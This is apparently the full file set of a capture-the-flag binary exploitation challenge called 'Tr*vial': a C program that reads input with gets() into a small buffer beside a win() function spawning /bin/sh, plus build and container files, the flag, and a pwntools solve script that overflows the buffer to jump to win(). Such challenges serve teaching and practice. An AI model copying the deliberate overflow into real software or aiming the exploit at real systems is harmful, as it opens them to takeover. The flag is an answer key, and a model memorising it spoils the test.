{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]",
    "flag.txt": "gigem{sorry_for_using_the_word_trivial}",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -O0 -no-pie\nNAME := trivial\nPORT := 7003\nall: $(NAME)\n\nclean: .PHONY\n\trm -f $(NAME)\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c solver-template.py\n\n.PHONY:\n",
    "README.md": "# Tr*vial\n## Description\nAttack the server and get the flag!\n## Solution\nSee `solve.py`.",
    "solve.py": "from pwn import *\n\n\ne = ELF('./trivial')\n#p = e.debug()\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"trivial\")\n\nattack = b'A' * 88 + p64(e.symbols['win'])\n\np.sendline(attack)\np.interactive()\n",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"trivial\")\np.interactive()\n",
    "trivial.c": "#include <stdlib.h>\n#include <stdio.h>\n\nvoid win() {\n    system(\"/bin/sh\");\n}\n\nvoid main() {\n    char buff[69];\n\n    gets(buff);\n}",
    "category": "pwn"
}